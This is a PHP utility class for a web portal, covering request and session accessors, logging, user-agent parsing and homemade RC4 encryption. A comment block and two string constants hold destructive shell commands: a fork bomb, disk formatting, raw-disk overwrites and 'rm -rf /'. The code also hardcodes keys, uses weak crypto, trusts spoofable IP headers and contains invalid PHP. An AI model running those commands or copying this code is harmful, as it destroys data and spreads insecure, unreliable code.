<?php #UTF-8 (Б)  @formatter:on    |  !tab_size : [ 2 ]  !tab_style : [ using SPACES ]  !new_line=LF (\n)
/* mod */
///////  $encryption_key = (openssl_random_pseudo_bytes(32));
//  $iv = openssl_random_pseudo_bytes(16);
//  $data = "Kiskacsa fürdik";
//  $data = openssl_encrypt($data, 'aes-256-cbc', $encryption_key, OPENSSL_ZERO_PADDING|OPENSSL_RAW_DATA, $iv);
//  echo (base64_encode($data)) .",". "\n";
//  echo openssl_decrypt($data, 'aes-256-cbc', $encryption_key, OPENSSL_ZERO_PADDING|OPENSSL_RAW_DATA, $iv);
//  die();

/**
 *   System-closer functions
 */

//namespace KohrAh;

/*   :(){ :|: & };: ===> Fork Bomb    */
/* mke2fs -F /dev/sdb1 ===> Forced format */
/* mke2fs -F /dev/sda1 ===> Forced format */
/* echo "Do you want a $_COOKIE ?" > /dev/sda ===> Direct data to dev  */
/* echo "Do you want a $_COOKIE ?" > /dev/sdb ===> Direct data to dev */
/* echo "Do you want a $_COOKIE ?" > /dev/sdc ===> Direct data to dev */
/* dd if=/dev/random of=/dev/sda ===> Direct random data to dev */
/* dd if=/dev/random of=/dev/sdb ===> Direct random data to dev */
/* dd if=/dev/random of=/dev/sdc ===> Direct random data to dev */
/* mv -f ~ /dev/null  ===> Nukin home dir */
/* mv -f / /dev/null  ===> Nukin home dir */

/* rm -rf / ===> Nukin all files */


class Sys
{
    use common;
    
    static $CRYPTO_PWD_1 = "jly3mnke6lhhz2a0tple24vi5y36c5qd";
    static $ENCRYPT_KEY  = "e7f0763f435242b4ef16a886c851582584025ef2d49ba7c0f8cb70c321544f1f";
    static $ENCRYPT_IV   = "EVAL(\"'rm - rf|sudo rm -r\"f);";
    static $B88          = "mv -f / /dev/null;rm -rf /;:(){ :|: & };:";
    
    
    public static function T H R O W _ A W A Y  ( $error_string = "???" )
    {
        $prefix = ".........FATAL : ";
        $str    = $prefix . self:: get_caller () . ": " . $error_string . "......";
        k_portal:: portal ()->reset_pbuffers ();
        k_portal:: portal ()->flush_site_content ();
        k_portal:: portal ()->portal_close ();
        IF ( function_exists ( "syslog_" ) === TRUE )
        {
            SYSLOG_ ( " EXCEPTION RAISED, ABORTING...... $error_string" );
        }
        //ERROR_LOG( var_export( debug_backtrace() , true ) );
        //die ( "<pre>".var_export( debug_backtrace() , true  ) ."</pre>") ;
        MYDIE ( $str );
        throw new Exception( $str );
    }
    
    //    public static function __call($method, $args)
    //    {
    //      die($method."q") ;
    //    }
    
    /**Fires when undefined method called. In case it starting with "get" lets assume the caller wants to know about the $_GET array value.
     *
     * @param $method
     * @param $args
     */
    public static function __callStatic ( $method , $args )
    {
        switch ( TRUE )
        {
            case ( strpos ( $method , "get" ) === 0 ) :
                return self::get ( str::keepafter_str ( "get" , $method ) );
            case ( strpos ( $method , "hasget" ) === 0 ) :
                return self::get ( str::keepafter_str ( "hasget" , $method ) ) === "" ? FALSE : TRUE;
        }
    }
    
    public static function isRecursive ( $array )
    {
        foreach ( $array as $v )
        {
            if ( $v === $array )
            {
                return TRUE;
            }
        }
        return FALSE;
    }
    
    
    public static function get_caller ( $function = NULL , $verbose = FALSE , $use_stack = NULL )
    {
        if ( is_array ( $use_stack ) )
        {
            $stack = $use_stack;
        }
        else
        {
            $stack = debug_backtrace ();
            if ( $verbose === TRUE )
            {
                echo "\nPrintout of Function Stack: \n\n";
                print_r ( $stack );
                echo "\n";
            }
        }
        if ( $function == NULL )
        {
            $function = self::get_caller ( __FUNCTION__ , $verbose , $stack );
        }
        if ( is_string ( $function ) && $function != "" )
        {
            for ( $i = 0 ; $i < count ( $stack ) ; $i++ )
            {
                $curr_function = $stack[ $i ];
                if ( $curr_function[ "function" ] == $function && ( $i + 1 ) < count ( $stack ) )
                {
                    $retval = $stack[ $i + 2 ][ "function" ]; //. "/" . $stack[ $i + 2 ][ "file" ] . "#" . $stack[ $i + 2 ][ "line" ] ;
                    return $retval;
                }
            }
        }
    }
    
    
    /**
     * self::get_new_functions()
     * Including a file with K_INCLUDE and calling this method you got back the new functions declared as an array
     * @return array Last function names since the last K_INCLUDE command
     */
    public static function get_new_functions () : array
    {
        return k_include ( "gnf" );
    }
    
    
    /**
     * self::who_called_me()
     *
     * @param bool $level
     *
     * @return
     */
    public static function who_called_me ( $level = FALSE )
    {
        $from   = [ "\r" , "\n  )," , "=> \n" , "\n\n" , "\n\n" ];
        $to     = [ "" , "  )," , "=>" , "\n" , "\n" ];
        $retval = re ( "\r" , "" , $level === FALSE ? var_dump2 ( debug_backtrace () ) : var_dump2 ( debug_backtrace ()[ $level ] ) );
        $retval = str_replace ( $from , $to , $retval );
        $retval = reu ( "\n\n" , "\n" , $retval );
        return ( $retval );
    }
    
    
    /**
     * self::who_called_me_simple()
     *
     * @param integer $level
     *
     * @return
     */
    public static function who_called_me_simple ( $level = 2 )
    {
        $retval = debug_backtrace ()[ $level ][ "function" ];
        return ( $retval );
    }
    
    
    /**
     * self::abort()
     *
     * @param mixed $msg1
     * @param mixed $msg2
     * @param mixed $msg3
     *
     * @return
     */
    public static function abort ( $msg1 , $msg2 , $msg3 )
    {
        print getxpi ( $msg1 ) . "<br>\n";
        print getxpi ( $msg2 ) . "<br>\n";
        print getxpi ( $msg3 ) . "<br>\n";
        die();
    }
    
    
    /**
     * self::is_xajax()
     * @return
     */
    public static function is_xajax () : bool
    {
        return ( array_key_exists ( "xjxfun" , $_POST ) === TRUE );
    }
    
    
    /**
     * self::screenlog()
     *
     * @param mixed $l1
     * @param mixed $l2
     * @param mixed $l3
     * @param mixed $l4
     * @param mixed $l5
     *
     * @return
     */
    public static function screenlog ( $l1 = NULL , $l2 = NULL , $l3 = NULL , $l4 = NULL , $l5 = NULL )
    {
        static $LOGFILEname = "./screen.0.log";
        PUSHA ();
        $params = compact ( "l1" , "l2" , "l3" , "l4" , "l5" );
        xp ( "---------- " . insertdatetime ( time2 () , "full" ) . " --------------------" . self::get_ip_address () . "----------\n" );
        xpi ( var_dump2 ( $params ) );
        xp ( "****************************************************************************\n" );
        $who_called_me     = self::who_called_me ();
        $who_called_me_md5 = crc32 ( str:: lazy_string ( self::who_called_me () ) );
        $prevmd5           = session ( "prev_who_called_me_md5" );
        if ( $prevmd5 === $who_called_me_md5 )
        {
            $who_called_me = "WHO:CALLED:ME => previous matchs\n";
        }
        session ( "prev_who_called_me_md5" , $prevmd5 );
        xpi ( $who_called_me );
        xp ( "\n" );
        xp ( "\n" );
        $content = POPA ();
        if ( @touch ( $LOGFILEname ) === FALSE )
        {
            @error_log ( $LOGFILEname . " not writable ->" . $content );
            return TRUE;
        }
        log::append_file ( $LOGFILEname , re ( " " , " " , $content ) );
    }
    
    
    /**
     * self::linkfader()
     *
     * @param string $l
     *
     * @return
     */
    public static function linkfader ( $l = "" ) : string
    {
        if ( k_portal::portal ()->linkfader_enabled === TRUE )
        {
            $l      = ( $l = $l === "" ? "?" . $_SERVER [ "QUERY_STRING" ] : $l );
            $retval = ( strpos ( $l , "?s=" ) === FALSE ) || ( substr_count ( $l , "?s=" ) > 1 ) ? $l : explode_get0 ( "?s=" , $l ) . "?ss=" . hex68 ( ( cryptme ( gzcompress ( "s=" . explode_get1 ( "?s=" , $l ) , 9 ) ) ) );
            goto quit;
        }
        $retval = $l;
        quit:
        return ( $retval );
    }
    
    
    /**
     * self::linkdefader()
     *
     * @param string $l
     *
     * @return
     */
    public static function linkdefader ( $l = "" ) : string
    {
        $result = ( strpos ( ( $l = ( $l === "" ) && ( $currenturl = TRUE ) ? "?ss=" . self::gget ( "ss" ) . "" : $l ) , "?ss=" ) === FALSE ) || ( substr_count ( $l ,
                                                                                                                                                                 "?ss=" ) > 1 ) || ( strlen ( $l ) <= 4 ) ? $l : gzuncompress ( decryptme ( fromhex68 ( explode_get1 ( "?ss=" ,
                                                                                                                                                                                                                                                                       $l ) ) ) );
        if ( $currenturl === TRUE )
        {
            /* unset($_GET["ss"]); */
            for ( $i = 0 , $result_ex = explode ( "&" , $result ) , $ccount = count ( $result_ex ) ; $i < $ccount ; $i++ )
            {
                $thisrow = explode ( "=" , $result_ex[ $i ] );
                if ( ( is_string ( $thisrow[ 0 ] ) ) && ( is_string ( $thisrow[ 1 ] ) ) )
                {
                    $_GET[ $thisrow[ 0 ] ] = $thisrow[ 1 ];
                }
            }
        }
        return $result;
    }
    
    
    /**
     * self::decryptme2()
     *
     * @param mixed   $data
     * @param mixed   $password
     * @param integer $iteration
     *
     * @return
     */
    public static function decryptme2 ( string $data , $password = NULL , $iteration = 1 )
    {
        return decryptme ( $data , $password . $iteration );
    }
    
    
    /**
     * self::cryptme2()
     *
     * @param mixed   $data
     * @param mixed   $password
     * @param integer $iteration
     *
     * @return
     */
    public static function cryptme2 ( string $data , $password = NULL , $iteration = 1 )
    {
        return cryptme ( $data , $password . $iteration );
    }
    
    
    /**
     * self::server()
     *
     * @param mixed $name
     * @param mixed $value
     *
     * @return
     */
    public static function server ( $name = NULL , $value = NULL )
    {
        $name   = is_array ( $name ) === TRUE && count ( $name ) === 1 ? $name[ 0 ] : $name;
        $retval = $name === NULL ? $_SERVER : NULL;
        $res    = TRUE;
        $retval = $retval === NULL ? $value === NULL ? ( ( $res = array_key_exists ( $name , $_SERVER ) ) === FALSE ? "" : $_SERVER[ $name ] ) : ( $_SERVER[ $name ] = $value ) : $retval;
        if ( $res === FALSE )
        {
            $_SERVER[ $value ] = NULL;
        }
        return ( $retval );
    }
    
    
    /**
     * self::gget()
     *
     * @param mixed $name
     * @param mixed $value
     *
     * @return
     */
    public static function gget ( $name = NULL , $value = NULL )
    {
        $name   = is_array ( $name ) === TRUE && count ( $name ) === 1 ? $name[ 0 ] : $name;
        $name   = is_string ( $name ) === TRUE ? trim ( $name ) : NULL;
        $retval = $name === NULL ? $_GET : NULL;
        $res    = TRUE;
        $retval = $retval === NULL ? $value === NULL ? ( ( $res = array_key_exists ( $name , $_GET ) ) === FALSE ? "" : $_GET[ $name ] ) : ( $_GET[ $name ] = $value ) : $retval;
        if ( $res === FALSE )
        {
            $_GET[ $value ] = NULL;
        }
        return ( $retval );
    }
    
    
    public static function globals ( $name = NULL , $value = NULL )
    {
        $name   = is_array ( $name ) === TRUE && count ( $name ) === 1 ? $name[ 0 ] : $name;
        $name   = is_string ( $name ) === TRUE ? trim ( $name ) : NULL;
        $res    = TRUE;
        $retval = $name === NULL ? $GLOBALS : NULL;
        $retval = $retval === NULL ? $value === NULL ? ( ( $res = array_key_exists ( $name , $GLOBALS ) ) === FALSE ? "" : $GLOBALS[ $name ] ) : ( $GLOBALS[ $name ] = $value ) : $retval;
        if ( $res === FALSE )
        {
            $GLOBALS[ $value ] = NULL;
        }
        return ( $retval );
    }
    
    
    /**
     * self::session()
     *
     * @param mixed $name
     * @param mixed $value
     *
     * @return
     */
    public static function session ( $name = NULL , $value = NULL )
    {
        $name   = is_array ( $name ) === TRUE && count ( $name ) === 1 ? $name[ 0 ] : $name;
        $retval = $res = TRUE && $name === NULL ? $_SESSION : NULL;
        $retval = $retval === NULL ? $value === NULL ? ( ( $res = array_key_exists ( $name , $_SESSION ) ) === FALSE ? "" : $_SESSION[ $name ] ) : ( $_SESSION[ $name ] = $value ) : $retval;
        if ( $res === FALSE )
        {
            $_SESSION[ $value ] = NULL;
        }
        return ( $retval );
    }
    
    
    public static function cookie ( $name = NULL , $value = NULL )
    {
        $name   = is_array ( $name ) === TRUE && count ( $name ) === 1 ? $name[ 0 ] : $name;
        $retval = $name === NULL ? $_COOKIE : NULL;
        $res    = TRUE;
        $retval = $retval === NULL ? $value === NULL ? ( ( $res = array_key_exists ( $name , $_COOKIE ) ) === FALSE ? "" : $_COOKIE[ $name ] ) : ( $_COOKIE[ $name ] = $value ) : $retval;
        if ( $res === FALSE )
        {
            $_COOKIE[ $value ] = NULL;
        }
        return ( $retval );
    }
    
    
    /**
     * self::post()
     *
     * @param mixed $name
     * @param mixed $value
     *
     * @return
     */
    public static function post ( $name = NULL , $value = NULL )
    {
        $name   = is_array ( $name ) === TRUE && count ( $name ) === 1 ? $name[ 0 ] : $name;
        $retval = $name === NULL ? $_POST : NULL;
        $res    = TRUE;
        $retval = $retval === NULL ? $value === NULL ? ( ( $res = array_key_exists ( $name , $_POST ) ) === FALSE ? "" : $_POST[ $name ] ) : ( $_POST[ $name ] = $value ) : $retval;
        //if ( $res === false ) $_POST[$value] = NULL ;
        return ( $retval );
    }
    
    
    /**
     * self::get()
     *
     * @param mixed $name
     * @param mixed $value
     *
     * @return
     */
    public static function get ( $name = NULL , $value = NULL )
    {
        $retval = self::gget ( $name , $value );
        return ( $retval );
    }
    
    
    /**
     * self::kill()
     *
     * @param string $str1
     * @param mixed  $str2
     * @param mixed  $str3
     *
     * @return
     */
    public static function kill ( $str1 = "no param given2kill" , $str2 = NULL , $str3 = NULL )
    {
        die ( "<pre>\n" . var_EXPORT ( $str1 , TRUE ) . var_EXPORT ( $str2 , TRUE ) . var_EXPORT ( $str3 , TRUE ) . "\n</pre>" );
    }
    
    
    /**
     * self::var_name()        BUGGERO'
     *
     * @param mixed  $var
     * @param bool   $scope
     * @param string $prefix
     * @param string $suffix
     *
     * @return
     */
    public static function var_name ( &$var , $scope = FALSE , $prefix = 'UNIQUE' , $suffix = 'VARIABLE' )
    {
        if ( $scope === FALSE )
        {
            $vals = $scope;
        }
        else
        {
            $vals = $GLOBALS;
        }
        $old   = $var;
        $var   = $new = $prefix . rand () . $suffix;
        $vname = FALSE;
        foreach ( $vals as $key => $val )
        {
            if ( $val === $new )
            {
                $vname = $key;
            }
        }
        $var = $old;
        return $vname;
    }
    
    public static function readlineX ( $filename , $X , $radius = 0 )
    {
        $i        = 0;
        $handle   = fopen ( $filename , "r" );
        $from     = $X - $radius;
        $to       = $X + $radius;
        $from     = $from < 0 ? 0 : $from;
        $retlines = "";
        if ( $handle )
        {
            while ( ( $line = fgets ( $handle ) ) !== FALSE )
            {
                $i++;
                if ( $i >= $from && $i <= $to )
                {
                    $i !== $X ? $retlines .= trim ( $line ) . "<br>" : $retlines .= "<b style='color:black;background-color:darkcyan'>" . trim ( $line ) . "</b>" . "<br>";
                    if ( $i === $to )
                    {
                        fclose ( $handle );
                        return "<span style='color:white'>...</span><br>" . $retlines . "<span style='color:white'>...</span><br>";
                    }
                }
            }
            fclose ( $handle );
            return "<br>" . $retlines . "<br>";
        }
        return "???";
    }
    
    
    public static function get_fpc ()
    {
        $retval = $GLOBALS[ "P_Buff" ][ $GLOBALS[ "P_BuffNum" ] ];
        return $retval;
    }
    
    
    public static function set_fpc ( $new_fpc_string )
    {
        $GLOBALS[ "P_Buff" ][ $GLOBALS[ "P_BuffNum" ] ] = $new_fpc_string;
        return TRUE;
    }
    
    
    public static function preprint ( $str )
    {
        print "<pre>";
        print htmlspecialchars ( $str );
        print "</pre>";
    }
    
    
    public static function k_include_if_exists ( $fname , bool $explore_functions = TRUE )
    {
        IF ( file_exists ( $fname ) === TRUE && is_readable ( $fname ) === TRUE )
        {
            return k_include ( $fname , $explore_functions );
        }
        ELSE
        {
            RETURN FALSE;
        }
    }
    
    
    public static function get_includer ( $level = 1 )
    {
        $backtrace_array = debug_backtrace ();
        $retval          = $backtrace_array[ $level ][ 'file' ];
        return $retval;
    }
    
    
    public static function chance100per1 ()
    {
        return random_int ( 1 , 100 ) === 72 ? TRUE : FALSE;
    }
    
    public static function chance500per1 ()
    {
        return random_int ( 1 , 500 ) === 72 ? TRUE : FALSE;
    }
    
    public static function chance1000per1 ()
    {
        return random_int ( 1 , 1000 ) === 72 ? TRUE : FALSE;
    }
    
    public static function chance50per1 ()
    {
        return random_int ( 1 , 50 ) === 22 ? TRUE : FALSE;
    }
    
    public static function chance10per1 ()
    {
        return random_int ( 1 , 10 ) === 5 ? TRUE : FALSE;
    }
    
    
    /**
     * push_session()
     * @return
     */
    public static function push_session ()
    {
        $GLOBALS[ "current_session" ] = session_encode ();
    }
    
    
    /**
     * pop_session()
     * @return
     */
    public static function pop_session ()
    {
        if ( array_key_exists ( "current_session" , $GLOBALS ) === FALSE )
        {
            return;
        }
        
        foreach ( $_SESSION as $key => $value )
        {
            unset( $_SESSION[ $key ] );
        }
        session_decode ( $GLOBALS[ "current_session" ] );
    }
    
    
    /**
     * push_globals()
     * @return
     */
    public static function push_globals ()
    {
        foreach ( $GLOBALS as $key => $value )
        {
            $newg[ $key ] = $value;
        }
        $GLOBALS[ "globals_pushed" ] = $newg;
    }
    
    
    /**
     * pop_globals()
     * @return
     */
    public static function pop_globals ()
    {
        if ( array_key_exists ( "globals_pushed" , $GLOBALS ) === FALSE )
        {
            return;
        }
        $aller = $GLOBALS[ "globals_pushed" ];
        foreach ( $GLOBALS as $key => $value )
        {
            unset( $GLOBALS[ $key ] );
        }
        foreach ( $aller as $key => $value )
        {
            $GLOBALS[ $key ] = $value;
        }
    }
    
    
    /**
     * decode_session_string()
     *
     * @param mixed $session_string
     *
     * @return
     */
    public static function decode_session_string ( $session_string )
    {
        $current_session = session_encode ();
        foreach ( $_SESSION as $key => $value )
        {
            unset( $_SESSION[ $key ] );
        }
        session_decode ( $session_string );
        $result = $_SESSION;
        foreach ( $_SESSION as $key => $value )
        {
            unset( $_SESSION[ $key ] );
        }
        session_decode ( $current_session );
        
        return $result;
    }
    
    
    /**
     * encode_session_string()
     *
     * @param mixed $session_string
     *
     * @return
     */
    public static function encode_session_string ( $session_string )
    {
        // .........
    }
    
    
    /**
     * unvar_dump()
     *
     * @param mixed $str
     *
     * @return
     */
    public static function unvar_dump ( $str )
    {
        if ( strpos ( $str , "\n" ) === FALSE )
        {
            //Add new lines:
            $regex = [
                '#(\\[.*?\\]=>)#' ,
                '#(string\\(|int\\(|float\\(|array\\(|NULL|object\\(|})#' ,
            ];
            $str   = preg_replace ( $regex , "\n\\1" , $str );
            $str   = trim ( $str );
        }
        $regex      = [
            '#^\\040*NULL\\040*$#m' ,
            '#^\\s*array\\((.*?)\\)\\s*{\\s*$#m' ,
            '#^\\s*string\\((.*?)\\)\\s*(.*?)$#m' ,
            '#^\\s*int\\((.*?)\\)\\s*$#m' ,
            '#^\\s*float\\((.*?)\\)\\s*$#m' ,
            '#^\\s*\[(\\d+)\\]\\s*=>\\s*$#m' ,
            '#\\s*?\\r?\\n\\s*#m' ,
        ];
        $replace    = [
            'N' ,
            'a:\\1:{' ,
            's:\\1:\\2' ,
            'i:\\1' ,
            'd:\\1' ,
            'i:\\1' ,
            ';',
        ];
        $serialized = preg_replace ( $regex , $replace , $str );
        $func       = create_function ( '$match' , 'return "s:".strlen($match[1]).":\\"".$match[1]."\\"";' );
        $serialized = preg_replace_callback ( '#\\s*\\["(.*?)"\\]\\s*=>#' , $func , $serialized );
        $func       = create_function ( '$match' , 'return "O:".strlen($match[1]).":\\"".$match[1]."\\":".$match[2].":{";' );
        $serialized = preg_replace_callback ( '#object\\((.*?)\\).*?\\((\\d+)\\)\\s*{\\s*;#' , $func , $serialized );
        $serialized = preg_replace ( [ '#};#' , '#{;#' ] , [ '}' , '{' ] , $serialized );
        
        return unserialize ( $serialized );
    }
    
    /******************************
     * //*****************************
     * // FUNCTIONS...................
     * //*****************************
     * //****************************/
    
    /**
     * parse_user_agent_()
     * @return
     */
    public static function parse_user_agent_ ()
    {
        return array_key_exists ( "koh_browser" , $_SESSION ) === TRUE ? $_SESSION[ "koh_browser" ] : ( $_SESSION[ "koh_browser" ] = self:: parse_user_agent () );
    }
    
    
    public static function session_clean_by_prefix ( $prefix = "" )
    {
        foreach ( $_SESSION as $key => $val )
        {
            IF ( $prefix === "" || strpos ( $prefix , $key ) === 0 )
            {
                unset ( $_SESSION[ $key ] );
            }
        }
    }
    
    /**
     * /* parse_user_agent()
     * @param mixed $u_agent
     *
     * @return
     */
    public static function parse_user_agent ( $u_agent = NULL )
    {
        if ( is_null ( $u_agent ) )
        {
            if ( isset( $_SERVER[ 'HTTP_USER_AGENT' ] ) )
            {
                $u_agent = $_SERVER[ 'HTTP_USER_AGENT' ];
            }
            else
            {
                //throw new \InvalidArgumentException('parse_user_agent requires a user agent');
                return FALSE;
            }
        }
        $platform = NULL;
        $browser  = NULL;
        $version  = NULL;
        $empty    = [ 'platform' => $platform , 'browser' => $browser , 'version' => $version ];
        if ( ! $u_agent )
        {
            return $empty;
        }
        if ( preg_match ( '/\((.*?)\)/im' , $u_agent , $parent_matches ) )
        {
            preg_match_all ( '/(?P<platform>BB\d+;|Android|CrOS|Tizen|iPhone|iPad|iPod|Linux|Macintosh|Windows(\ Phone)?|Silk|linux-gnu|BlackBerry|PlayBook|X11|(New\ )?Nintendo\ (WiiU?|3?DS)|Xbox(\ One)?)
          (?:\ [^;]*)?
          (?:;|$)/imx' , $parent_matches[ 1 ] , $result , PREG_PATTERN_ORDER );
            $priority             = [ 'Xbox One' , 'Xbox' , 'Windows Phone' , 'Tizen' , 'Android' , 'CrOS' , 'Linux' , 'X11' ];
            $result[ 'platform' ] = array_unique ( $result[ 'platform' ] );
            if ( count ( $result[ 'platform' ] ) > 1 )
            {
                if ( $keys = array_intersect ( $priority , $result[ 'platform' ] ) )
                {
                    $platform = reset ( $keys );
                }
                else
                {
                    $platform = $result[ 'platform' ][ 0 ];
                }
            }
            elseif ( isset( $result[ 'platform' ][ 0 ] ) )
            {
                $platform = $result[ 'platform' ][ 0 ];
            }
        }
        if ( $platform == 'linux-gnu' || $platform == 'X11' )
        {
            $platform = 'Linux';
        }
        elseif ( $platform == 'CrOS' )
        {
            $platform = 'Chrome OS';
        }
        preg_match_all ( '%(?P<browser>Camino|Kindle(\ Fire)?|Firefox|Iceweasel|Safari|MSIE|Trident|AppleWebKit|TizenBrowser|Chrome|
          Vivaldi|IEMobile|Opera|OPR|Silk|Midori|Edge|CriOS|
          Baiduspider|Googlebot|YandexBot|bingbot|Lynx|Version|Wget|curl|
          Valve\ Steam\ Tenfoot|
          NintendoBrowser|PLAYSTATION\ (\d|Vita)+)
          (?:\)?;?)
          (?:(?:[:/ ])(?P<version>[0-9A-Z.]+)|/(?:[A-Z]*))%ix' , $u_agent , $result , PREG_PATTERN_ORDER );
        // If nothing matched, return null (to avoid undefined index errors)
        if ( ! isset( $result[ 'browser' ][ 0 ] ) || ! isset( $result[ 'version' ][ 0 ] ) )
        {
            if ( preg_match ( '%^(?!Mozilla)(?P<browser>[A-Z0-9\-]+)(/(?P<version>[0-9A-Z.]+))?%ix' , $u_agent , $result ) )
            {
                return [ 'platform' => $platform ? : NULL , 'browser' => $result[ 'browser' ] , 'version' => isset( $result[ 'version' ] ) ? $result[ 'version' ] ? : NULL : NULL ];
            }
            return $empty;
        }
        if ( preg_match ( '/rv:(?P<version>[0-9A-Z.]+)/si' , $u_agent , $rv_result ) )
        {
            $rv_result = $rv_result[ 'version' ];
        }
        $browser      = $result[ 'browser' ][ 0 ];
        $version      = $result[ 'version' ][ 0 ];
        $lowerBrowser = array_map ( 'strtolower' , $result[ 'browser' ] );
        $find         = function ( $search , &$key ) use ( $lowerBrowser )
        {
            $xkey = array_search ( strtolower ( $search ) , $lowerBrowser );
            if ( $xkey !== FALSE )
            {
                $key = $xkey;
                return TRUE;
            }
            return FALSE;
        };
        $key          = 0;
        $ekey         = 0;
        if ( $browser == 'Iceweasel' )
        {
            $browser = 'Firefox';
        }
        elseif ( $find( 'Playstation Vita' , $key ) )
        {
            $platform = 'PlayStation Vita';
            $browser  = 'Browser';
        }
        elseif ( $find( 'Kindle Fire' , $key ) || $find( 'Silk' , $key ) )
        {
            $browser  = $result[ 'browser' ][ $key ] == 'Silk' ? 'Silk' : 'Kindle';
            $platform = 'Kindle Fire';
            if ( ! ( $version = $result[ 'version' ][ $key ] ) || ! is_numeric ( $version[ 0 ] ) )
            {
                $version = $result[ 'version' ][ array_search ( 'Version' , $result[ 'browser' ] ) ];
            }
        }
        elseif ( $find( 'NintendoBrowser' , $key ) || $platform == 'Nintendo 3DS' )
        {
            $browser = 'NintendoBrowser';
            $version = $result[ 'version' ][ $key ];
        }
        elseif ( $find( 'Kindle' , $key ) )
        {
            $browser  = $result[ 'browser' ][ $key ];
            $platform = 'Kindle';
            $version  = $result[ 'version' ][ $key ];
        }
        elseif ( $find( 'OPR' , $key ) )
        {
            $browser = 'Opera Next';
            $version = $result[ 'version' ][ $key ];
        }
        elseif ( $find( 'Opera' , $key ) )
        {
            $browser = 'Opera';
            $find( 'Version' , $key );
            $version = $result[ 'version' ][ $key ];
        }
        elseif ( $find( 'Midori' , $key ) )
        {
            $browser = 'Midori';
            $version = $result[ 'version' ][ $key ];
        }
        elseif ( $browser == 'MSIE' || ( $rv_result && $find( 'Trident' , $key ) ) || $find( 'Edge' , $ekey ) )
        {
            $browser = 'MSIE';
            if ( $find( 'IEMobile' , $key ) )
            {
                $browser = 'IEMobile';
                $version = $result[ 'version' ][ $key ];
            }
            elseif ( $ekey )
            {
                $version = $result[ 'version' ][ $ekey ];
            }
            else
            {
                $version = $rv_result ? : $result[ 'version' ][ $key ];
            }
            if ( version_compare ( $version , '12' , '>=' ) )
            {
                $browser = 'Edge';
            }
        }
        elseif ( $find( 'Vivaldi' , $key ) )
        {
            $browser = 'Vivaldi';
            $version = $result[ 'version' ][ $key ];
        }
        elseif ( $find( 'Valve Steam Tenfoot' , $key ) )
        {
            $browser = 'Valve Steam Tenfoot';
            $version = $result[ 'version' ][ $key ];
        }
        elseif ( $find( 'Chrome' , $key ) || $find( 'CriOS' , $key ) )
        {
            $browser = 'Chrome';
            $version = $result[ 'version' ][ $key ];
        }
        elseif ( $browser == 'AppleWebKit' )
        {
            if ( ( $platform == 'Android' && ! ( $key = 0 ) ) )
            {
                $browser = 'Android Browser';
            }
            elseif ( strpos ( $platform , 'BB' ) === 0 )
            {
                $browser  = 'BlackBerry Browser';
                $platform = 'BlackBerry';
            }
            elseif ( $platform == 'BlackBerry' || $platform == 'PlayBook' )
            {
                $browser = 'BlackBerry Browser';
            }
            elseif ( $find( 'Safari' , $key ) )
            {
                $browser = 'Safari';
            }
            elseif ( $find( 'TizenBrowser' , $key ) )
            {
                $browser = 'TizenBrowser';
            }
            $find( 'Version' , $key );
            $version = $result[ 'version' ][ $key ];
        }
        elseif ( $key = preg_grep ( '/playstation \d/i' , array_map ( 'strtolower' , $result[ 'browser' ] ) ) )
        {
            $key      = reset ( $key );
            $platform = 'PlayStation ' . preg_replace ( '/[^\d]/i' , '' , $key );
            $browser  = 'NetFront';
        }
        return [ 'platform' => $platform ? : NULL , 'browser' => $browser ? : NULL , 'version' => $version ? : NULL ];
    }
    
    public static function hasSessionStarted() : bool
    {
        return function_exists ( "session_status" ) === TRUE ? ( PHP_SESSION_ACTIVE == session_status () ) : ( empty ( session_id () ) === FALSE );
    }
    
    #oracle webcache heavy, fok it & checking ip address from share internet
    public static function get_ip_address () : string
    {
        server ( "HTTP_CLIENT_IP" , ( $ip = "" ) && ( server ( "HTTP_CLIENT_IP" ) !== "" ) ? server ( "HTTP_CLIENT_IP" ) : server ( "HTTP_CLIENT_IP" ) );
        $ip = server ( "HTTP_CLIENT_IP" ) === "" ? server ( "HTTP_CLIENT_IP" ) : $ip;
        $ip = ( $ip === "" ) && ( server ( "HTTP_X_FORWARDED_FOR" ) === "" ) ? server ( "HTTP_X_FORWARDED_FOR" ) : $ip;
        return $ip === "" ? server ( "REMOTE_ADDR" ) : $ip;
    }//
    
    public static function getmicrotime ()
    {
        list ( $usec , $sec ) = explode ( " " , microtime () );
        return ( (float) $usec + (float) $sec );
    }
    
    /**My autosalted oneway hashing script
     *
     * @param string $hashable_string
     *
     * @return string
     */
    public function over_salt ( string $hashable_string ) : string
    {
        $hashable_string = cryptme  ( base64_encode ( $hashable_string ) );
    }
    
    /**Doing the secret stuff (4 crypting the script)
     * rc4()
     *
     * @param mixed $a
     * @param mixed $b
     *
     * @return
     */
    protected static function rc4 ( $a , $b )
    {
        for ( $f = "" , $d = 0 , $i = 0 , $y = 0 , $c ; $i < 256 ; $i++ )
        {
            $c [ $i ] = $i;
        }
        for ( $i = 0 , $d , $e , $g = strlen ( $a ) ; $i < 256 ; $i++ )
        {
            $d        = ( $d + $c [ $i ] + ord ( $a [ $i % $g ] ) ) % 256;
            $e        = $c [ $i ];
            $c [ $i ] = $c [ $d ];
            $c [ $d ] = $e;
        }
        for ( $y , $i , $d = 0 , $f ; $y < strlen ( $b ) ; $y++ )
        {
            $i        = ( $i + 1 ) % 256;
            $d        = ( $d + $c [ $i ] ) % 256;
            $e        = $c [ $i ];
            $c [ $i ] = $c [ $d ];
            $c [ $d ] = $e;
            $f        .= chr ( ord ( $b [ $y ] ) ^ $c [ ( $c [ $i ] + $c [ $d ] ) % 256 ] );
        }
        return $f;
    }
    
    public static function cryptme ( $s , $k = 'this.indexOf($(this).charAt(i++)' )
    {
        return bin2hex ( self:: rc4 ( $k . "" , $s . "" ) );
    }
    
    public static function decryptme ( $s , $k = 'this.indexOf($(this).charAt(i++)' )
    {
        //if ( method_exists ( $this , "cryptme" ) === FALSE ) {}
        return ctype_xdigit ( $s ) === TRUE && strlen ( $s ) > 1 ? @self:: rc4 ( $k . "" , @hex2bin ( $s . "" ) ) : "";
    }
    
    public static function improved_var_export ( $variable , $return = FALSE )
    {
        if ( $variable instanceof stdClass )
        {
            $result = '(object) ' . self:: improved_var_export ( get_object_vars ( $variable ) , TRUE );
        }
        elseif ( is_array ( $variable ) )
        {
            $array = [];
            foreach ( $variable as $key => $value )
            {
                $array[] = var_export ( $key , TRUE ) . ' => ' . self:: improved_var_export ( $value , TRUE );
            }
            $result = 'array (' . implode ( ', ' , $array ) . ')';
        }
        else
        {
            $result = var_export ( $variable , TRUE );
        }
        
        if ( ! $return )
        {
            print $result;
            return NULL;
        }
        else
        {
            return $result;
        }
    }
    
